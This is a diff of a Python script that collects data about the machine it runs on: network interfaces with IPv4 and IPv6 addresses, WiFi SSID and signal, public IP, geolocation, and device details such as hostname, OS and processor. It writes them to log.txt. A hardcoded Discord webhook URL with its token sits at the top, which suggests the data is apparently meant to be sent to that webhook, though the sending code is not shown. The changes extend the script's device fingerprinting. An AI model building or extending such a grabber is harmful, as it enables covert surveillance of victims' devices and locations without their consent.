@@ -2,6 +2,8 @@ import subprocess
 import requests
 import json
 import netifaces
+import platform
+import socket
 
 # Discord Webhook URL
 webhook_url = 'https://discord.com/api/webhooks/1260028879729332275/bhliony5asku0znPNm424ciasbyH9-qoj926nz3Z8yeHy7TPM5GvhNHGajpBW-HRnovA'
@@ -28,9 +30,12 @@ def get_network_info():
 
     for iface in interfaces:
         addrs = netifaces.ifaddresses(iface)
+        info = {}
         if netifaces.AF_INET in addrs:
-            addresses = addrs[netifaces.AF_INET]
-            network_info[iface] = addresses
+            info['IPv4'] = addrs[netifaces.AF_INET]
+        if netifaces.AF_INET6 in addrs:
+            info['IPv6'] = addrs[netifaces.AF_INET6]
+        network_info[iface] = info
     
     return network_info
 
@@ -59,25 +64,50 @@ def get_location_info(public_ip):
 
     return location_info
 
-# Collect detailed network and WiFi information
+# Function to get device information
+def get_device_info():
+    device_info = {
+        'hostname': socket.gethostname(),
+        'platform': platform.system(),
+        'platform_release': platform.release(),
+        'platform_version': platform.version(),
+        'architecture': platform.machine(),
+        'processor': platform.processor(),
+    }
+    return device_info
+
+# Collect detailed network, WiFi, and device information
 network_info = get_network_info()
 wifi_details = get_wifi_details()
 public_ip = get_public_ip()
 location_info = get_location_info(public_ip)
+device_info = get_device_info()
 
 # Write collected information to log.txt
 with open('log.txt', 'w') as f:
+    f.write("=== Device Information ===\n")
+    for key, value in device_info.items():
+        f.write(f"{key.capitalize()}: {value}\n")
+    f.write("\n")
+    
     f.write("=== Network Information ===\n")
-    for iface, addresses in network_info.items():
+    for iface, info in network_info.items():
         f.write(f"Interface: {iface}\n")
-        for addr in addresses:
-            f.write(f"IP Address: {addr['addr']}\n")
-            f.write(f"Netmask: {addr['netmask']}\n")
+        if 'IPv4' in info:
+            for addr in info['IPv4']:
+                f.write(f"IPv4 Address: {addr['addr']}\n")
+                f.write(f"Netmask: {addr['netmask']}\n")
+        if 'IPv6' in info:
+            for addr in info['IPv6']:
+                f.write(f"IPv6 Address: {addr['addr']}\n")
+                f.write(f"Netmask: {addr.get('netmask', 'N/A')}\n")
         f.write("\n")
+
     f.write(f"=== WiFi Details ===\n")
     f.write(f"SSID: {wifi_details['ssid']}\n")
     f.write(f"Signal Strength: {wifi_details['signal_strength']} dBm\n")
     f.write("\n")
+
     f.write(f"=== Public IP and Location ===\n")
     f.write(f"Public IP Address: {public_ip}\n")
     if 'error' in location_info:
